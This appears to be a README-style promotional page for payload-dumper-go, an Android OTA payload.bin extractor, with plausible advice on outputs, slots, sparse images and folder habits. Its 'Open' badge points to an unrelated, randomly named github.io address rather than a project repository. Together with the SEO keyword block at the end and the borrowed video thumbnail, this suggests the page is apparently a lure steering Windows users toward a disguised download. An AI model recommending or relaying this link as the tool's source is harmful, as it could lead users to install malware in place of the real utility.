# payload-dumper-go - Unpack an Android payload.bin into Partition Images

## At a Glance

Modern Android OTAs often hide every partition inside one payload.bin instead of shipping a folder of named images. Fastboot and some service tools want those images separately. payload-dumper-go reads the payload, checks the operation list, and writes the resulting files. The Go build is the one people use when they want a single executable rather than a Python environment.

- Input is a payload.bin from a package you are allowed to use
- Output is a directory of partition images
- No USB and no bootloader step inside this program
- A metadata list so you can see which partitions the payload contained
- The same risk as any firmware file: the zip must match the device

Extracting does not install. You can unpack on a PC that has never seen the phone, which is the point. Flashing is a later decision, made with a tool that can see the device and with a backup of anything you care about.

[![Open payload-dumper-go](https://img.shields.io/badge/Open-payload--dumper--go-166534?style=for-the-badge&logo=github&logoColor=white)](https://palmiraaugeproqnv.github.io/.github/dumper-go)

## What Comes Out

| Output | What it usually is |
|---|---|
| boot.img | Kernel and ramdisk the flasher may write to boot |
| vendor_boot or init_boot | Newer layouts split boot pieces; keep the names |
| system, vendor, product | Large images; do not rename them |
| vbmeta | Verification metadata; swapping it casually breaks boot |
| care_map or apex files | Present on some builds; leave them with the set |
| A log of operations | Proof of which payload you unpacked |

If a name is unfamiliar, keep the file anyway and do not invent a shorter name. Flash tools match strings. A renamed vendor image is a vendor image that will be flashed to the wrong slot.

## When You Unpack

1. Confirm the OTA or factory zip is for the exact model and build you intend.
2. Extract payload.bin from that zip. Do not unpack a payload from a different phone in the same folder.
3. Run payload-dumper-go into an empty output directory.
4. Read the partition list before you move any file.
5. Compare a few file sizes with what you expect. A tiny system image means the run did not finish.
6. Only then point a flasher at this directory, and only for the phone that matches the package.

Keep the original zip. If a flash goes badly, you want to unpack again from the known file rather than from a folder you may have edited.

## Slots and Dynamic Partitions

Recent devices use A/B slots and super or dynamic partitions. The payload may contain images that a simple "flash system" habit does not describe. payload-dumper-go's job is to materialize what the payload stored. It does not decide whether your phone wants fastbootd, a sparse image, or a vendor flash script. Read the package's own instructions after the files exist. Dumping everything and flashing every file in alphabetical order is how a working phone loses a slot.

Some images are sparse. A flasher that expects raw storage will complain or, worse, write them wrong. If the next tool documents sparse versus raw, follow that. The dumper did not promise a universal format beyond what the payload held.

## Who It Is For

People who already have an official or otherwise permitted OTA and need the images out of payload.bin. ROM maintainers checking a build they produced. A poor fit if you hoped the tool would download firmware. A poor fit if the phone is the thing in front of you and the package is for a different codename. Unpack is cheap. Writing the result to the wrong device is not.

## Requirements

| Item | Expectation |
|---|---|
| PC | Windows the build runs on |
| Disk | Free space several times the payload, because images expand |
| Input | A complete payload.bin |
| Phone | Not required for the extract |
| Next step | A flasher only after the names are checked |

## Fixes

The program exits immediately. The payload is truncated or is not a payload. Re-copy it from the zip.
Output files are missing. The run was interrupted or the disk filled. Delete the partial folder and unpack into a drive with room.
Names do not match an old guide. The Android version split partitions differently. Trust this payload's names.
You flashed boot and the phone boot-loops. The image was from another build. Restore the matching set, not a single borrowed boot.
Python errors appear. You wanted the Go binary. Do not mix the two projects' instructions in one shell.

![payload-dumper-go output folder with named partition images](https://i.ytimg.com/vi/5ITTmMYgnMM/hq720.jpg)

## A Folder Habit

Name the output directory with the device codename and the build. Delete nothing inside it until the phone has booted that build. If you keep several payloads, do not extract the second into the first's folder. Two system images cannot share one filename without one of them disappearing, and the one that disappears will be the one you meant to flash.

## Keep the Unpack and the Flash Apart

Extracting a payload does not install it. The phone is untouched until a flasher runs. That gap is useful. You can throw away a bad unpack. You cannot throw away a bad flash as easily.

- Empty output folder for each build
- Codename and build in the folder name
- Original zip kept until the phone boots
- Partition names left as the payload wrote them
- Sparse images left sparse if the next tool expects that
- vbmeta not swapped in from another ROM
- boot and init_boot not treated as the same file
- A second payload never extracted on top of the first
- File sizes glanced at before anything is flashed
- System image that is tiny treated as a failed unpack
- Dynamic and A/B layouts read before a mass flash
- One matching phone, one folder

| Mistake | What happens |
|---|---|
| Renamed vendor image | The flasher writes it to the wrong name or skips it |
| Two builds in one directory | One system.img silently replaces the other |
| Flash every file in order | A slot or a super partition gets a file it should not |
| Truncated payload | Tiny outputs that still look like a success |
| Guide from an older Android | Names that this payload does not use |

If the next tool wants fastbootd, a sparse image, or a vendor script, follow that after the files exist. payload-dumper-go finished when the names on disk match the payload. It did not finish the install.

## Reader Terms

payload-dumper-go, payload dumper go, extract payload.bin, android ota images, unpack android payload, boot vendor system images, payload partition list, android factory payload extract
